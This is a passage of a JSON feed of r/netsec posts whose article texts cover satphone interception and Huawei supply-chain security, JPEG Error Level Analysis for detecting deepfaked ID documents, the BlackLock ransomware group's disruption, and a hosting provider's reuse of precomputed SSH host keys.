delivering automated, continuous testing against real attacker behaviour.</p><p>By combining Proactive Threat Intelligence and External Attack Surface Management into a single <b>Preemptive Exposure Management</b> capability, the <a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\">watchTowr Platform</a> helps organisations rapidly react to emerging threats – and gives them what matters most: </p><div><div><section><div><section><h3>Gain early access to our research, and understand your exposure, with the watchTowr Platform</h3><a href=\"https://watchtowr.com/demo/\">REQUEST A DEMO</a></section></div></section></div></div>","contentLength":19408,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1npbkxz/is_this_bad_this_feels_bad_goanywhere/"},{"title":"Tiantong-1 and satphone security: Part 2","url":"https://www.midnightblue.nl/blog/tiantong-1-and-satphone-security-part-2","date":1758706705,"author":"/u/2ROT13","guid":86915,"unread":true,"content":"<h3>General satphone SIGINT capabilities</h3><p>Given their prominence in matters of national security, it is unsurprising there are many (commercialized) SIGINT capabilities for satphones available. In fact according to an internal publication by the NSA’s Signals Intelligence Directorate (SID) from 2006, contained in the Snowden leaks, GMR-based Thuraya was considered one of the US intelligence community’s top priorities. In addition to satellite-based monitoring capabilities as exemplified by the <a href=\"https://space.skyrocket.de/doc_sdat/orion-3_nro.htm\">MENTOR 4</a> SIGINT satellite <a href=\"https://www.thespacereview.com/article/3095/1\">closely following</a> the Thuraya 2 satellite, significant investments were made in ground-based collection capabilities using the NSA’s and systems.</p><p>According to a leaked publication from 2003, the NSA did not have the desired Foreign Satellite interception (FORNSAT) coverage at the time. In these and other publications, a picture emerges of rapidly expanding collection sites numbering 9 in 2002 to 12 (+40 regional) sites in 2012 in addition to collection performed through 2nd party partners via the <a href=\"https://en.wikipedia.org/wiki/Stateroom_(surveillance_program)\">STATEROOM</a>&nbsp;program.</p><p>Regional collection happens through <a href=\"https://en.wikipedia.org/wiki/Special_Collection_Service\"><strong><em>Special Collection Service</em> (SCS)</strong></a><strong> units based at embassies and consulates</strong> as neatly summarized by <a href=\"https://www.electrospaces.net/2013/12/nsas-global-interception-network.html#fornsat\">Electrospaces</a>. These units not only service interception posts at the embassies themselves but also roll out covert surveillance infrastructure throughout a target country.</p><p>While no current publications seem to mention Tiantong-1, there is much information available about SIGINT capabilities for GMR-based SATCOM systems such as Thuraya and Inmarsat. Such information can be obtained from public brochures by vendors such as <a href=\"https://www.stratign.com/unified-satellite-phone-interception-system/\">Stratign</a>, <a href=\"https://www.shoghicom.com/products/intelligence-surveillance-reconnaissance/satellite-phone-gmpcs-monitoring\">Shoghi</a>, and <a href=\"https://pegasusintelligence.com/docs/thuraya-monitoring-system.pdf\">Pegasus Intelligence</a> as well as product brochures from vendors such as L-3 TRL, Rheinmetall, Verint, and Rhode &amp; Schwarz leaked as part of the <a href=\"https://wikileaks.org/spyfiles/\">Wikileaks Spy Files</a>. All of these systems seem to have fairly identical capabilities, architectures, and challenges.</p><p>They offer passive interception capabilities allowing for:</p><ul role=\"list\"><li>: Including extraction of content (through automatic real-time decryption as described below) and metadata (e.g. spot beam ID, caller numbers, times, cryptographic information, etc.).‍</li><li>: Though certain vendors state this is considered difficult due to extensive coverage areas and large spot beams, some claim to extract GPS coordinates from handset traffic or achieve geo-location based on network location information or overlap areas.‍</li><li>: Audio recording, speech analysis (speaker &amp; language identification, keyword spotting, etc.), media carving, OCR, and typical link analysis and dataset querying.</li></ul><p>Regardless of the GMR version or frequency bands in use, the general operating principle comes down to satellites covering a large geographical area in smaller, focused areas of coverage referred to as . For example, the GMR-1 based Thuraya system consists of several satellites each covering a different geographical area. These areas are then subdivided into dozens of spotbeams each covering hundreds of kilometers.</p><p>As illustrated below, communications within a single spotbeam take place in the L-band while feeder link communications between gateway stations and satellites take place in C-/Ku-bands in the regional beam.</p><p><strong>Two-way (duplex) traffic interception is only possible in a limited number of spot beams</strong> (depending on distance between spotbeams with similar signal characteristics such as frequencies and timeslots) centered around a monitoring system. <a href=\"https://wikileaks.org/spyfiles/document/delta-spa/6_the-challenge-of-packet-data-collection-from-satellite/\"></a><strong>, monitoring and intercepting satphone communications presents several challenges</strong> related to synchronization (such as differing delays when signals are captured at different geographical points), missing directional traffic (forward/return links), and complexities in mapping captures from spotbeams to those from regional beams. This typically means all available channels need to be intercepted simultaneously even if one's actual area of interest may be limited.</p><p>‍On the other hand, <strong>feeder link communications can be monitored from any location within the satellite’s footprint area</strong>. These communications allow for monitoring (but not intercepting) call activity on return links in multiple spotbeams (without requiring spotbeam coverage by a local monitoring system) via received signaling information (which includes geo-location relevant data and caller IDs).</p><p>‍It should be noted that interception capabilities are not merely constrained by satellite system architectural aspects but also by hardware capabilities such as the numbers of frequency channels that can be monitored simultaneously. Such limitations depend limitations of utilized DSP/FPGA technology and rack space for system modules. In addition, <strong>export controls tend to restrict capabilities</strong> as well such as artificially limiting the number of simultaneously monitorable calls.</p><p>While most of the GMR-1 interception equipment discussed here can likely not be repurposed easily against Tiantong, <strong>there is plenty of COTS SDR hardware available these days capable of handling S- and C-Band traffic</strong> that could serve as the basis for a TT monitoring solution.</p><p>As <a href=\"https://wikileaks.org/spyfiles/document/arpege/ARPEGE-2010-ISIS4GIRIS-en/\">leaked documents</a> from a Rhode &amp; Schwarz GMR-2 monitoring system show most satphone monitoring systems consist of several elements:</p><p><strong>Strategic Monitoring System</strong>These systems, sometimes referred to as central stations, are typically capable of continuous live monitoring and interception of terminals in surrounding cluster of spotbeams and include integrated decryption and analytic capabilities. Such systems are likely based at dedicated SIGINT sites or SCS locations.</p><p>These systems allow for expanding system coverage and full duplex interception capabilities with several additional spotbeams surrounding the remote monitoring system. Remote monitoring systems are typically connected to strategic systems through always-on connections (e.g. PTSN, WAN, or satellite link). Such remote monitoring systems are likely rolled out throughout a country by SCS operators, and likely connect back to the in-country SCS site.</p><p>‍<strong>Tactical Monitoring System</strong>Tactical monitoring systems are for use by operational teams requiring real-time intercept of terminals in areas either lacking spotbeam coverage. These systems are typically highly portable and vehicle-mountable and facilitate otherwise hard-to-obtain terminal uplink interception capabilities up to tens of kilometers within line-of-sight. Optimal usage requires site surveys to determine suitable monitoring location and antenna positioning.</p><p><strong>Airborne Monitoring System</strong>In addition to the above listed stationary monitoring systems, certain vendors also offer airborne satphone monitoring systems for deployment on manned and unmanned aircraft - essentially offering similar advantages to the tactical monitoring system.</p><h3>Supply chain security &amp;&nbsp;'hard targets'</h3><p>Ever since the <a href=\"https://en.wikipedia.org/wiki/2017_Ukraine_ransomware_attack\">NotPetya</a> and <a href=\"https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach\">SolarWinds</a> incidents supply chain security has been an increasingly hot topic. Worries around (hardware) supply chain security have recently taken on an additional kinetic dimension with the <a href=\"https://en.wikipedia.org/wiki/2024_Lebanon_electronic_device_attacks\">Israeli attacks</a> on pagers and VHF radios operated by Hezbollah in Lebanon.‍<p>The Volkskrant article mentions typical operational security measures taken against supply chain threats to the procured Tiantong smartphones such as trying to ensure non-sequential serial numbers and limited batch sizes (no doubt also opting for diversified manufacturers and points of sale).</p>Interestingly, the leaked <a href=\"https://en.wikipedia.org/wiki/ANT_catalog\">NSA ANT catalog</a> shows that as far back as 2008-2009 the NSA had developed a software implant named for the Thuraya 2520 satphone handsets. The implant was described as being deployed through (temporary) physical access to the satphone though remote deployment options (likely via remote exploitation) were being investigated.</p><p>‍Implantation of Tiantong smartphones will have different considerations from purpose-built Thuraya handsets. On the one hand, such smartphones consist of much more COTS hardware and software (Android on ARM with one of a handful of well-understood basebands) for which a sophisticated adversary likely already has capabilities and/or expertise.But things are a little different for more modern Huawei smartphones since they<strong> increasingly rely on Huawei-proprietary software and hardware</strong>. Take the Huawei Mate 60 Pro. Starting with HarmonyOS NEXT, Android has been abandoned as the foundation of HarmonyOS in favor of an <a href=\"https://en.wikipedia.org/wiki/HarmonyOS_NEXT#HongMeng_kernel\"></a> running its own native app format. The Kirin 9000S SoC has an integrated <a href=\"https://library.techinsights.com/public/sectioned-blog-viewer/43d8d7a3-8a0a-4a2c-938e-add4f7fd63b4\">Balong 5000 baseband</a>, <strong>both by Chinese manufacturer HiSilicon</strong>. A publicly <a href=\"https://inmobile.ir/boarden/17286/Huawei_Mate_60_Pro_(HL1CMSM).html\">available teardown</a> lists a component marked <a href=\"https://www.hisilicon.com/en/products/connectivity/smartphone-wearable/smartphone/hi1105\">HI1105</a> which matches HiSilicon’s HI11xx IC used as a WiFi chip by <a href=\"https://www.techinsights.com/blog/tale-two-foundries-tsmc-and-hlmc-and-one-design-house-hisilicon\">other</a> Huawei Mate smartphones. This means an adversary will have to invest a lot of resources to build new exploits and software/hardware implants for these Huawei phones and their OS, baseband, and Wi-Fi chip – all of which are now proprietary to Huawei. Venezuelan president Nicolás Maduro <a href=\"https://securityaffairs.com/181984/security/venezuelas-president-maduro-said-his-huawei-mate-x6-cannot-be-hacked-by-us-cyber-spies.html\">even seems to believe</a> the Huawei Mate X6 gifted to him <em>simply cannot be hacked by US intelligence agencies</em>.</p><p>The downside of this approach is that Huawei can no longer benefit so easily from security updates and advances coming in through Western ecosystems and <strong>they will increasingly form a self-selecting priority target</strong> for Western intelligence agencies (similar to how <a href=\"https://www.risky.biz/crimephones-are-a-cops-best-friend/\">crimephones</a> self-select for targeting by law enforcement). The opacity of proprietary technology really isn’t much of a barrier either, given Western intelligence’s <a href=\"https://www.reuters.com/article/business/nsa-infiltrates-servers-of-china-telecom-giant-huawei-report-idUSBREA2L0PD/\">long-standing targeting of Huawei</a>. In fact, some public security research has already been performed on the HarmonyOS NEXT ecosystem and Balong baseband [<a href=\"https://www.blackhat.com/us-25/arsenal/schedule/#decompiler-for-harmonyos-next-45569\">1</a>, <a href=\"https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Komaromy-How-To-Tame-Your-Unicorn-wp.pdf\">2</a>, <a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Grassi-Exploitation-of-a-Modern-Smartphone-Baseband-wp.pdf\">3</a>].</p><p>While the Tiantong ecosystem doesn’t look like brand new magical fairy dust technology, it might make sense for certain parties worried about Western or under-resourced intelligence agencies surveilling regular cellular networks. It essentially forces such agencies to deploy expensive SIGINT capabilities around the right spot beams and while the U.S. can operate unimpeded at SCS sites in virtually all countries surrounding Iran, this isn’t the case for every SIGINT agency everywhere and likely still requires some more perilous rollout of covert infrastructure inside Iran itself. On top of that if no GPS information can be extracted from Tiantong traffic, geolocation becomes far less granular. Depending on caveats mentioned above, cracking its cryptography might prove a tough challenge as well and remote exploitation and supply chain attacks are also likely to be more laborious (for now). Still, good opsec would need to be observed by disabling cellular capabilities and avoiding co-traveling devices. As such, while hardly revolutionary or foolproof - one can see how adopting Tiantong might make sense for certain actors.</p><p>For those interested in advancing their RF security skills, Midnight Blue will be delivering its <strong>Red Team SIGINT training at </strong><a href=\"https://www.blackhat.com/eu-25/training/schedule/#red-team-sigint-practical-sdr-hacking-for-mission-critical-automotive-aviation-marine-and-physical-access-control-targets-46360\"></a>.</p><p>This practically-oriented course, aimed at red team operators and pentesters, will teach attendees the fundamentals of RF, SDR, and SIGINT before quickly moving on to effective guidance on identifying and decoding unknown signals as well as exploiting common pitfalls in RF security.‍<p>Where other SDR trainings tend to focus on enterprise and IoT RF protocols such as 4G/5G, WiFi, RFID, and BT, this training focuses on important but rarely addressed RF technologies such as automotive, aviation, marine, and physical access control RF protocols and mission-critical radio (e.g. TETRA, DMR, P25) used by police, military, private security, and critical infrastructure.</p></p><p><strong>Hands-on exercises such as intercepting and decrypting handheld radio comms and breaking automotive security systems</strong> are alternated with thorough overviews of relevant RF protocols and their security posture as well as case studies of real-world RF attacks on railways, water utilities, drones, and police/military radios.</p><ul role=\"list\"><li><strong>An overview of the course can be found </strong><a href=\"https://www.midnightblue.nl/explore/training/red-team-sigint-practical-sdr-hacking\"></a>‍</li></ul>","contentLength":11860,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1np7rda/tiantong1_and_satphone_security_part_2/"},{"title":"Tea continued - Unauthenticated access to 150+ Firebase databases, storage buckets and secrets","url":"https://ice0.blog/docs/openfirebase","date":1758653064,"author":"/u/Woowowow91","guid":86720,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1noppeo/tea_continued_unauthenticated_access_to_150/"},{"title":"Image Forensics: Detecting AI Fakes with Compression Artifacts","url":"https://dmanco.dev/2025/09/15/basics-of-image-forensics-1.html","date":1758646023,"author":"/u/Doch88","guid":86661,"unread":true,"content":"<p>Let’s start with some context. Why am I writing this post?</p><p>I work at <a href=\"https://www.fourthline.com/\">Fourthline</a>, a company that manages the Know Your Customer (KYC) process for companies like Revolut, TradeRepublic, and N26. \nFor those who don’t know what KYC is, think of when you register online to use one of these services and are asked to take a selfie and a picture of your ID document to prove you are who you claim to be. <p>\nThat’s KYC in a nutshell, and as you may guess, we don’t want fraudsters to slip through. If you’ve ever played </p><a href=\"https://en.wikipedia.org/wiki/Papers,_Please\">Papers, Please</a>, you can imagine this isn’t always easy. </p><p>Fraudsters are getting better, and technology is helping them. \nDeepfakes and AI-generated selfies and documents have become some of their tools, and my job at Fourthline is also to fight this kind of AI. <p>\nYes, I’m an AI engineer who fights AI. A sort of cyberwar destined to become even more challenging as technology advances. </p></p><p>But to fight deepfakes, I should also study how similar problems were handled in the past. \nImage manipulation has existed for decades, long before generative models reached today’s quality. <p>\nSo let’s go back to 2007 and talk about compression and </p><strong>Error Level Analysis (ELA)</strong>.</p><p>Almost every image on the internet is compressed; handling uncompressed images everywhere would be too expensive. \nLet’s look at an example. </p><p>I took an image with my camera with a resolution of 6000x4000. \nQuick math: that’s 24,000,000 pixels. Every pixel stores information about color, and color in computer science is usually expressed with 8 bits. <p>\nTo cover most colors, we need three channels — red, green, and blue — so every pixel carries 8 × 3 bits of information. </p></p><p>The weight of this image should be <code>6000 × 4000 × 8 × 3 = 576,000,000 bits</code>, or 72 megabytes. \nInstead, it weighs only 6 megabytes. </p><p>JPEG is the most widely used image compression algorithm. </p><p>In simple terms, the algorithm works by removing parts of the image that are barely noticeable to the human eye. It has a parameter called  that sets how aggressive the compression is.\nA quality of 100% means very little is removed, while 1% means heavy information loss. </p><p>Because information is lost, the image content is altered in subtle ways. If you look at the single pixel values, you’ll notice differences. Depending on the chosen quality, these differences may be invisible to the eye but still exist. \nThese differences are a trace left by the JPEG compression, a sort of fingerprint. We call them . </p><p>Now the interesting part comes.  \nSince JPEG compression is applied to the entire image, these artifacts should always be  inside the image. \nIf the image is tampered with in some way - say an object is removed in Photoshop - this will affect the JPEG artifacts as well.\nYou would notice an inconsistency of these artifacts in the particular area of the image that was altered. \nAnd this is exactly what ELA is based on.</p><ul><li>Take the image to analyze</li><li>Compress it again with JPEG at a chosen quality - this will become a parameter of ELA</li><li>Calculate the difference between the two images</li></ul><p>The result is an ELA map to interpret.  \nThe assumption here is that the image (or parts of it) was compressed with JPEG at some point. </p><p>Let’s use a toy example to explain how it works. </p><p>Using something from my domain of work, let’s consider this specimen of a French national ID card. </p><p>Suppose I know it was compressed at JPEG quality 95%. I’ll use that later. \nNow, I inpaint the image with an AI model and get this:</p><p>And, importantly, I <strong>save this deepfake in PNG format</strong>. \nUnlike JPEG, PNG uses  compression, meaning no information is lost. </p><p>Now, using the information above, we perform ELA with a .\nIn this way, the part of the image that was already compressed with the same quality factor should not produce any new artifact.</p><p>The tampered area is obvious. We successfully detected the deepfake ID and blocked a fraudster. </p><p>But in reality, you may not know the original JPEG quality, and it’s unlikely that the manipulated image (previously a JPEG) would be saved as PNG.</p><p>Now let’s assume the deepfake was saved as JPEG. \nWe don’t know the quality factor. We only know that if the image was altered, part of it will be double-compressed and part single-compressed, producing inconsistency.</p><p>We perform ELA with JPEG quality 80% for both images.</p><p>Now ELA feels more like art. \nThere’s a clear difference, but without knowing tampering occurred, could you detect it from the map alone? <p>\nTo better understand how to interpret an ELA map, we can take some notes from how JPEG works: </p></p><ul><li>JPEG creates more artifacts in high-contrast areas (like text or borders), making ELA brighter there.</li><li>Flat surfaces should have uniform ELA values.</li><li>Similar textures should produce similar ELA.</li></ul><p>If some part of the image doesn’t respect these ‘rules’, then it might be suspicious. Like the deepfaked face on the ID, with a suspiciously bright ELA. \nFor more tips, see <a href=\"https://fotoforensics.com\">FotoForensics</a> and their tutorials.</p><p>So, can ELA be a solution to detect AI-manipulated images? \nNo, not by itself anyway. </p><p>ELA is just a tool in the Image Forensics toolbox that can help fight deepfakes. \nBut many other things can be used together with ELA, such as EXIF information, PRNU, PCA and so on. <p>\nAnd probably some of these techniques will be the topic for another post.</p></p>","contentLength":5276,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1noml13/image_forensics_detecting_ai_fakes_with/"},{"title":"BlackLock Ransomware: From Meteoric Rise to Sudden Disruption","url":"https://wealthari.com/blacklock-ransomware-from-meteoric-rise-to-sudden-disruption/","date":1758612957,"author":"/u/Koyaanisquatsi_","guid":86467,"unread":true,"content":"<p>&nbsp;has quickly climbed the ranks in the global ransomware scene, setting new benchmarks for attack frequency and technical complexity. Emerging in March 2024 under the name El Dorado, the group rapidly rebranded and, by late 2024, was responsible for a 1,425% surge in data leak site posts, making it the fifth most active ransomware group worldwide by January 2025.<a rel=\"noreferrer noopener\" target=\"_blank\" href=\"https://www.hipaajournal.com/blacklock-ransomware/\"></a></p><div><ul></ul></div><h2>Advanced Attack Techniques &amp; Double Extortion</h2><p>BlackLock distinguishes itself by deploying custom-built malware—eschewing leaked builder kits common among competitors—and leveraging a cross-platform approach that targets Windows, Linux, and VMware ESXi environments. The ransomware utilizes the powerful ChaCha20 stream cipher and advanced ECDH key exchange mechanisms to encrypt files and metadata, rendering standard recovery methods useless.<a rel=\"noreferrer noopener\" target=\"_blank\" href=\"https://cinchops.com/blacklock-ransomware/\"></a></p><p>BlackLock’s double extortion tactic combines file encryption with the exfiltration of sensitive data: victims are threatened with both permanent data loss and public exposure unless they pay the ransom. Encrypted files are renamed with randomized strings and extensions, and ransom notes are left titled “HOW_RETURN_YOUR_DATA.TXT” in compromised folders.<a rel=\"noreferrer noopener\" target=\"_blank\" href=\"https://darkatlas.io/blog/blacklock-ransomware-a-growing-threat-across-industries\"></a></p><h2>Operations Disrupted by Major Security Breach</h2><p>In March 2025, BlackLock faced an unprecedented disruption. Cybersecurity researchers from Resecurity exploited a vulnerability in the group’s data leak site, exposing its infrastructure, clearnet IPs, and MEGA storage accounts for stolen data. The situation escalated when the rival DragonForce group defaced BlackLock’s site and leaked configuration details—forcing BlackLock and its affiliates offline for the foreseeable future.<a rel=\"noreferrer noopener\" target=\"_blank\" href=\"https://www.resecurity.com/blog/article/blacklock-ransomware-a-late-holiday-gift-with-intrusion-into-the-threat-actors-infrastructure\"></a></p><h2>Ongoing Threats and Industry Impact</h2><p>Despite the recent dismantling, BlackLock’s legacy remains concerning. Its aggressive recruitment strategies, particularly on the Russian-language forum RAMP, and its unique technical sophistication have made it a blueprint for future ransomware operations. With attacks striking public services, technology firms, manufacturing, and government agencies across several countries, analysts warn that the threat model established by BlackLock will influence ransomware trends throughout 2025.<a rel=\"noreferrer noopener\" target=\"_blank\" href=\"https://www.loginsoft.com/post/the-blacklock-breakdown-tools-tactics-and-the-rivalry-that-brought-it-down\"></a></p><p>Security experts recommend organizations invest in robust backup solutions, network segmentation, comprehensive endpoint protection, and regular patch management to mitigate risks from similar cross-platform ransomware threats. Proactive monitoring and intelligence sharing remain critical in defending against evolving attack methodologies pioneered by groups like BlackLock.<a rel=\"noreferrer noopener\" target=\"_blank\" href=\"https://linuxsecurity.com/news/hackscracks/understanding-blacklock-linux-raas\"></a></p>","contentLength":2557,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1nob3s7/blacklock_ransomware_from_meteoric_rise_to_sudden/"},{"title":"Journeys in Hosting 1/x - Precomputed SSH Host Keys","url":"https://dataplane.org/jtk/blog/2025/09/hosting-stories-1/","date":1758578704,"author":"/u/jtkchicago","guid":86383,"unread":true,"content":"<p>In what I hope will be the debut of many in a series to come, I want to\nshare my experience and musings as a frequent traveler in the world of\nhosting providers.  Sometimes it will be just curious anomalies, of\nlittle interest to but a few.  But perhaps some tales told here will\nultimately prove valuable to others looking for insight even if to\nobscure scenarios.  Maybe especially to obscure scenarios.</p><p>This inaugural article will focus on the unusual and curious operational\nbehavior of precomputed SSH host keys in default system installs by\n<a href=\"https://www.lightnode.com/\">LightNode</a>.</p><p>LightNode is the server hosting brand of Kaopu Cloud, a global network\nservices provider based in China.  They have been providing KVM-based\nhosting for approximately four years as of this writing. A compelling\nfeature of LightNode’s offerings is the rather unique set of data center\nmarkets they operate in.  Otherwise, most of the capabilities the\nLightNode platform has are similar to many global hosting providers.\nThe one notable exception is they do not currently offer native IPv6\naddressing and connectivity.</p><blockquote><p>“[ASN-DROP entries are] associated with the worst of the worst\nbehavior. These are ASNs that our researchers wouldn’t recommend\nengaging with and are highly likely to announce or supply transit to\nIP ranges associated with malicious behavior. From networks hosting\nbotnet command and control systems, to “bulletproof” networks selling\nconnectivity/hosting to cyber criminals, to hardcore spammers, and\nmore.”</p></blockquote><p>Despite appearing in ASN-DROP, LightNode is relatively popular and\nseemingly widely used by many.  At the time of this writing the\noriginating AS announces the equivalent of about three /16 IPv4 prefixes\nor roughly 180 thousand addresses.  Far fewer than the biggest cloud\nproviders, and about an order of magnitude less than Linode (AS 63949)\nhas for example, but still more than what most .edu’s hold.</p><p>To setup a new system through LightNode’s user interface you choose a\nlocation, system type, system version if applicable, and minimum\nresource requirements to name a few configurable options.</p><p>A system type may be a vanilla operating system image such as Ubuntu,\nDebian, AlmaLinux, Arch Linux, CentOS, FreeBSD, Rocky Linux, or Windows.\nFor most OS types there are usually a few different versions to choose\nfrom.  There are over a dozen application-specific system types if you\nwant a preconfigured Docker or WordPress system for example.  This\nprocess is straightforward and would seem familiar to anyone who has had\nexperience using other hosting providers.  There is nothing particularly\nspecial about this process.  However, there is one very specific,\ndefault configuration detail on most if not all the LightNode installed\nsystems I’ve not seen replicated by any other hosting provider.</p><p>Each of LightNode’s Unix-based system options will install an OpenSSH\nserver listening on TCP port 22 by default.  You have the option of\nspecifying access to the SSH service with a public key or password.\nNormally, the SSH server host keys are generated as part of the package\ninstallation process using the  utility.  This would result\nin one-time unique pairs of keys for each and every system.  This is\nwhere LightNode seems to do something very different than every other\nhosting provider I’m aware of.</p><p>I tested a number of configurations and performed a survey of LightNode SSH\nservers listening on TCP port 22 to support this claim.  The table below shows\nthe number of TCP port 22 SSH listeners, distinct host keys, and distinct key\ntypes I found:</p><blockquote><table><tbody></tbody></table></blockquote><p>We would not expect to see so few keys compared to the number of TCP port 22\nlisteners.  Most modern Unix-based systems would have two or three different\nand unique keys per system, so in theory we’d expect see roughly 60,000 to\n90,000 keys.  Instead, on average we see at least 25 addresses for every key.\nIn fact it is a worse than that, because 1228 represents all key types and most\nhosts use three key types on average.  If we consider only  keys,\nthe most common type, this is what emerges:</p><blockquote><table></table></blockquote><p>The number of listeners that have an ssh-rsa host key is 98.5% of the\noriginal count, but the number of unique keys is now 39% of the\noriginal.  This is is significant amount of SSH host key duplication\nacross LightNode’s infrastructure.</p><p>This leads us to ask at least one more question.  If there are 478\ndistinct ssh-rsa host keys, how many times are each of those keys used?\nSurely LightNode doesn’t have 478 different system types does it?  No,\nit is something less than that.  We might not know exactly what the\nunique count is given that some templates may been retired, but we can\nexamine keys by popularity.  A table of statistics starts to get a\nlittle messy so I’ll simply tell you that the most popular ssh-rsa key\nis associated with LightNode’s Ubuntu 22.04 template.  It is seen on\nover 10,000 Listener addresses!  About one in three LightNode systems\nwith a public SSH listener on TCP port run Ubuntu 22.04 and all use the\nsame SSH host key.</p><p>So LightNode appears to have precomputed SSH host keys for each of the\nunique system templates it offers as an install option.  For example,\nall LightNode Debian 12 installations, by default, will use the same SSH\nhost key pairs that you’ll find stored in \nfiles.  Debian 11 will use another set of keys, but common to all Debian\n11 installations.  And so on.  It is unclear if this is a failure of\nentropy or if ssh-keygen is just never run, but the outcome is the same.\nThe host keys are predictable and shared with other hosts built from the\nsame system template configuration.</p><p>I can think of two scenarios where this anomaly might purposely occur in\npractice.  One, some hosts have multiple addresses assigned, and each\naddress has the same SSH server daemon active and willing to accept\nconnections across all interfaces.  In this case you’d see what looks\nlike a multi-homed system.  Honeypots may exhibit this behavior for\nexample.  Two, each listener address may be a different system, but host\nkeys are being generated from the exact same entropy source for\nssh-keygen, or are set to use precomputed ssh host keys.  You might find\nthis in certain enterprise or private environments as a way to simplify\nkey management.  It is this second scenario that LightNode appears to\nfall into.</p><p>It is unclear why LightNode sets up the SSH listener this way for\npublic, independent systems.  Perhaps the platform designer thought this\nwould speed-up system setup and VM creation time?  Should we care about\nthis?  Is it really bad?  Could this be something more insidious?  What,\nif anything, do we do?</p><p>Exposure of private encryption keys is a bad thing, and potentially\ncatastrophic.  However, when it comes to SSH server host keys, the\ndamage is not as great as it might be compared to other public key\nsystems.  SSH server host keys are used to “identify” the system.  An\nimpersonation attack is feasible here.  That is, if someone hijacked the\nSSH server IP address and used the same SSH host keys, an unwitting\nclient would not receive an authentication warning, because from the\nperspective of the SSH protocol, it looks like the same system.  A\nhijack, or MitM attack, of this sort might then be able to capture and\ndecrypt communications from there on out.  However, even if past traffic\nwas captured and the SSH server host keys are known, a separate session\nkey is used for traffic encryption that cannot be easily derived without\ndirect access to an end system at the time of operation.  In the\nimmortal words of the The Hitchhiker’s Guide to the Galaxy: Don’t Panic.</p><p>Nevertheless, this scenario is less than ideal.  I tried to contact\nLightNode support about this.  I also tried to reach out to\n<a href=\"https://www.cert.org.cn\">CNCERT/CC</a>, the national computer network\nemergency response technical team / coordination center of China.  A\ncolleague also tried to communicate with a CNCERT contact on my\nbehalf.  These attempts have been met with silence.  I’d guess this may\nhelp explain why the ASN is listed on the Spamhaus ASN-DROP.  Perhaps,\nas another colleague once put it, the difference in our native languages\ncan act as a natural firewall between us.</p><p>Technically LightNode or someone with the ability to hijack LightNode\naddresses could impersonate SSH servers there. I’m inclined to accept\nthis is a relatively low probability threat, and likely an unintentional\nvulnerability on LightNode’s part.  If you’re a LightNode customer, it\nwould be wise to setup new host keys.  If you or anyone you know has any\nability to convince LightNode to alter this practice, I’d be happy to\nhear about it.</p>","contentLength":8603,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1no01xq/journeys_in_hosting_1x_precomputed_ssh_host_keys/"}],"tags":["netsec"]}